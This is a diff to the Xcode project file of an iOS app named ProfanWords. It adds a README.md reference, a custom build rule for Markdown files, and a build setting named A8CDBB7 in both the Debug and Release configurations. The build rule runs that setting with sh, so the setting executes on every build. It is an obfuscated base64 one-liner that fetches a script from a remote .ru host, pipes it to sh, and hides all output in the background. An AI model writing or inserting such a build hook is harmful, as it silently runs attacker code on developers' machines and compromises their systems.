@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		E85C63471A40434CB17BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = DC18341103104F29997BBDC8; };
 		848F1E08200615E100FABF4C /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 848F1E07200615E100FABF4C /* AppDelegate.swift */; };
 		848F1E0A200615E100FABF4C /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 848F1E09200615E100FABF4C /* ViewController.swift */; };
 		848F1E0D200615E100FABF4C /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 848F1E0B200615E100FABF4C /* Main.storyboard */; };
@@ -16,6 +17,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		DC18341103104F29997BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		848F1E04200615E100FABF4C /* ProfanWords.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ProfanWords.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		848F1E07200615E100FABF4C /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		848F1E09200615E100FABF4C /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
@@ -48,6 +50,7 @@
 		848F1E05200615E100FABF4C /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				DC18341103104F29997BBDC8 /* README.md */,
 				848F1E04200615E100FABF4C /* ProfanWords.app */,
 			);
 			name = Products;
@@ -79,6 +82,7 @@
 				848F1E02200615E100FABF4C /* Resources */,
 			);
 			buildRules = (
+				A3A6C1C83D164F52AE7BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -121,11 +125,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		A3A6C1C83D164F52AE7BBDC8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8CDBB7}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		848F1E02200615E100FABF4C /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				E85C63471A40434CB17BBDC8 /* README.md */,
 				848F1E12200615E100FABF4C /* LaunchScreen.storyboard in Resources */,
 				848F1E0F200615E100FABF4C /* Assets.xcassets in Resources */,
 				848F1E1A20061A6300FABF4C /* Profanity.json in Resources */,
@@ -170,6 +192,7 @@
 		848F1E14200615E100FABF4C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3AtMm01ZHo4dnc4Mi5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -227,6 +250,7 @@
 		848F1E15200615E100FABF4C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3AtMm01ZHo4dnc4Mi5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
